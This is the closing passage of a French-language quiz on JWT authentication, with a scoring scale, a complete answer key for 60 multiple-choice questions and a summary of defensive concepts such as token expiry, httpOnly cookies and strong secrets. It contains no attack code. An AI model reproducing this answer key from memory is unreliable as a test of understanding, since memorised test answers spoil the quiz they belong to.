- Vérifier expiration (optionnel, UX)
- Envoyer token au serveur

Mais ne peut PAS :
- Vérifier signature (pas de secret)
- Créer tokens valides
- Modifier tokens

</details>

---

## Corrigé et Barème

### Calcul de votre Score

**Total questions** : 60

**Barème** :

| Score | Niveau | Commentaire |
|-------|--------|-------------|
| **55-60** | Expert | Excellente maîtrise JWT |
| **45-54** | Avancé | Bonne compréhension générale |
| **35-44** | Intermédiaire | Connaissances solides |
| **25-34** | Débutant | Bases acquises, à approfondir |
| **< 25** | Novice | Relire le cours complet |

---

### Répartition par Section

| Section | Questions | Points | Thème Principal |
|---------|-----------|--------|-----------------|
| **1** | 1-10 | 10 | Concepts de base |
| **2** | 11-20 | 10 | Structure JWT |
| **3** | 21-30 | 10 | Access/Refresh tokens |
| **4** | 31-40 | 10 | Stockage (localStorage, cookies) |
| **5** | 41-50 | 10 | Flow d'authentification |
| **6** | 51-60 | 10 | Sécurité avancée |

---

## Tableau Récapitulatif des Réponses

### Section 1-2 : Fondamentaux

| Q | Réponse | Concept Clé |
|---|---------|-------------|
| 1 | B | JSON Web Token |
| 2 | B | 3 parties |
| 3 | C | Séparateur point |
| 4 | A | Base64 (pas encrypté) |
| 5 | B | Jamais password |
| 6 | B | Intégrité/vérification |
| 7 | B | Encodé pas encrypté |
| 8 | B | Vérification serveur |
| 9 | B | Stateless |
| 10 | B | RFC 7519 |
| 11 | B | Header : alg + typ |
| 12 | C | exp = expiration |
| 13 | B | iat = Issued At |
| 14 | A | sub = subject (user ID) |
| 15 | B | HS256 symétrique |
| 16 | B | RS256 clé privée |
| 17 | C | Secret 256 bits min |
| 18 | B | aud = Audience |
| 19 | C | Modification invalide |
| 20 | B | Timestamp secondes |

### Section 3-4 : Tokens et Stockage

| Q | Réponse | Concept Clé |
|---|---------|-------------|
| 21 | B | Access 15min-1h |
| 22 | B | Refresh pour renouveler |
| 23 | C | Refresh 7-30 jours |
| 24 | B | Refresh minimal data |
| 25 | B | Refresh en DB |
| 26 | B | Token rotation |
| 27 | B | Utiliser refresh |
| 28 | D | Stateless + blacklist |
| 29 | A | Révocable si DB |
| 30 | D | Invalider + re-login |
| 31 | A | localStorage persiste |
| 32 | B | sessionStorage temporaire |
| 33 | B | httpOnly pas accessible JS |
| 34 | C | localStorage 5-10 MB |
| 35 | A | Cookie 4 KB |
| 36 | B | Vulnérable XSS |
| 37 | A | httpOnly protège XSS |
| 38 | C | sameSite protège CSRF |
| 39 | C/D | httpOnly ou Memory |
| 40 | C/A | httpOnly préféré |

### Section 5-6 : Flow et Sécurité

| Q | Réponse | Concept Clé |
|---|---------|-------------|
| 41 | B | 2 tokens |
| 42 | B | Authorization Bearer |
| 43 | B | 401 Unauthorized |
| 44 | B | POST /api/refresh |
| 45 | B | Re-login obligatoire |
| 46 | B | HTTPS obligatoire |
| 47 | B | Clear tous tokens |
| 48 | D | Invalider refresh |
| 49 | B | Décodable base64 |
| 50 | C | Impossible sans secret |
| 51 | B | Forging tokens |
| 52 | D | Dépend stockage |
| 53 | B | Alg "none" dangereux |
| 54 | D | Changer secret + purge |
| 55 | B | Jamais logger tokens |
| 56 | B | Multi-devices OK |
| 57 | B | Refresh token long |
| 58 | B | Snapshot pas sync |
| 59 | B | Restent valides |
| 60 | B | Client ne peut pas |

---

## Concepts Clés à Retenir

**Structure JWT** :
- 3 parties : Header.Payload.Signature
- Base64 encodé (pas encrypté, lisible)
- Signature garantit intégrité

**Deux types de tokens** :
- Access : Court (15 min), usage fréquent
- Refresh : Long (7 jours), usage rare

**Stockage sécurisé** :
- localStorage : Vulnérable XSS
- Cookie httpOnly : Protégé XSS
- Memory : Le plus sécurisé

**Sécurité essentielle** :
- Secret fort (256 bits minimum)
- HTTPS obligatoire
- Expiration obligatoire
- Jamais de données sensibles

**Flow complet** :
1. Login → Recevoir 2 tokens
2. Utiliser access (15 min)
3. Access expire → Utiliser refresh
4. Recevoir nouveaux tokens
5. Répéter jusqu'à logout

---

**Quiz complet JWT - 60 questions avec cases à cocher et réponses détaillées.**

